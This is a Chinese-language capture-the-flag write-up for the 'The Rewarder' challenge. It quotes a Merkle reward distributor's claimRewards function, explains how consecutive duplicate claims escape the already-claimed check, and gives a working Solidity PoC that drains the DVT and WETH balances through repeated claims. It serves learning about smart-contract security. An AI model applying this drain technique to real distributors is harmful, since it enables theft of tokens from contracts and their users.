# TheRewarder (24/09/04)

## 题目介绍

> **奖励者**
>
> **一份合同正在分配该死的宝贵代币和WETH的奖励。**
>
> **要申请奖励，用户必须证明他们包含在选定的受益人组中。不过不要担心汽油。合同已经过优化，允许在同一笔交易中申请多个代币。**
>
> **爱丽丝已经领取了她的奖励。你也可以认领你的！但你已经意识到合同中存在一个严重的漏洞。**
>
> **从分销商那里尽可能多地节省资金。将所有收回的资产转移到指定的收回账户。**

## 合约分析

根据题目指示这一道默克尔树分发代币领取代币奖励的合约，我们先看一下合同。发现只有一个合约，然后有两个地址列表一个weth一个dvt token的列表这是符合空投奖励领取的用户。我们发现爱丽丝在领取空投的时候调用了         `distributor.claimRewards(**{**inputClaims**:** claims, inputTokens**:** tokensToClaim**}**);`这个函数。这个函数参数有Claim的结构体参数构成，有批次，爱丽丝的数量和爱丽丝token的索引序号对应的莫克尔树证明。

核心函数是claimRewards也是漏洞所在的函数，我们可以看见在整个循环过程中只在i=数组长度的时候才进行设置已领取，我们可以完全可以发起多笔相同的交易多次重复领取奖励。

``` solidity
  // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });
        
      =======主要核心函数 》〉》〉》〉》
      
      
      
          // Allow claiming rewards of multiple tokens in a single transaction
    function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
        Claim memory inputClaim;
        IERC20 token;
        uint256 bitsSet; // accumulator
        uint256 amount;

        for (uint256 i = 0; i < inputClaims.length; i++) {
            inputClaim = inputClaims[i];

            uint256 wordPosition = inputClaim.batchNumber / 256;
            uint256 bitPosition = inputClaim.batchNumber % 256;

            if (token != inputTokens[inputClaim.tokenIndex]) {
                if (address(token) != address(0)) {
                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
                }

                token = inputTokens[inputClaim.tokenIndex];
                bitsSet = 1 << bitPosition; // set bit at given position
                amount = inputClaim.amount;
            } else {
                bitsSet = bitsSet | 1 << bitPosition;
                amount += inputClaim.amount;
            }
            // for the last claim
            //0 == 3
            //1 == 3
            //2 == 3
            //3 == 3
            
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
            bytes32 root = distributions[token].roots[inputClaim.batchNumber];

            if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

            inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
        }
    }

   
```



## 解题过程

我们知道爱丽丝在我们的列表中有地址那么同样的如果我们想要领取空投奖励，那么我们的地址也应该才这个列表里面。运行测试找出我们的地址，然后在去列表里面去找对应我们的数量。我们查看总共的所有代币数量，然后除我们的dvt和weth的数量。算出来总共需要多少次交易才可以把代币排空。最后构造交易把钱转到恢复账户。

**poc**

``````solidity
    function test_theRewarder() public checkSolvedByPlayer {
        console.log("playaddr: ", player);
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        // 计算交易，总共的数量除我们领取的数量
        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

    
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, 
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, 
                    proof: merkle.getProof(dvtLeaves, 188) 
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, 
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, 
                    proof: merkle.getProof(wethLeaves, 188) 
                });
            }
        }

        // 开始领取
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        // 转移到恢复账户
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

    }

``````